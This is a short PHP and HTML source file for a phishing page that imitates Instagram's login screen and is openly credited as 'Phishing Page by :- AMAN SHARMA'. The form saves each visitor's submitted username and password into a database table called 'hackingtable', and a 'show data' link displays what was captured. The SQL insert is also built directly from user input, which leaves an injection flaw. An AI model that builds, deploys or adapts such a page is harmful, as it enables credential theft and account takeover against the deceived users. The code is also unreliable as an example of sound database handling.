 <?php

include 'conn.php';

if(isset($_POST['done'])){

 $username = $_POST['username'];
 $password = $_POST['password'];
 $q = " INSERT INTO `hackingtable`(`username`, `password`) VALUES ( '$username', '$password' )";

 $query = mysqli_query($con,$q);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Instagram.com</title>
  <link rel="stylesheet" href="style.css">

 
</head>
<body>

    
<div class="logo"></div>    
  <div class="facebook"><div class="fblogo">f</div>Continue with Facebook</div>
    
 <div class="or"></div>
 <form method="post" >



<div class="username"> <input type="text" name="username" placeholder="Phone number,username, or email"></div>

 
 <div class="password"><input type="text" name="password" placeholder="Password"> </div>
<div class="frgtp">Forget password?</div> 
<div class="submitb"> <button type="submit" name="done" placeholder="Log In">Log In </button></div>
 <a href="https://github.com/Aman-Sharmaa/">Github</a>
     
     
     

 </div>
 </form>
    
    
 </div>


<div class="showdata"><a href="display.php">show data</p>Phishing Page by :- AMAN SHARMA </div>
</body>
</html>